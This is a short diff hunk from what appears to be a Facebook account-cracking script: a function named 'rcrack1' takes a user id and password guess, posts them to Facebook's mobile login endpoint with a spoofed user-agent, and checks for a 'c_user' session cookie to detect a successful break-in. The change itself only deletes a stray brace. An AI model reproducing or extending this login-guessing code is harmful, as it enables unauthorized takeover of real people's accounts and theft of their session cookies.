@@ -300,7 +300,6 @@ def rcrack1(uid,pwx,tl):
             'user-agent': pro,
             'viewport-width': '980',
 }
-                }
             lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
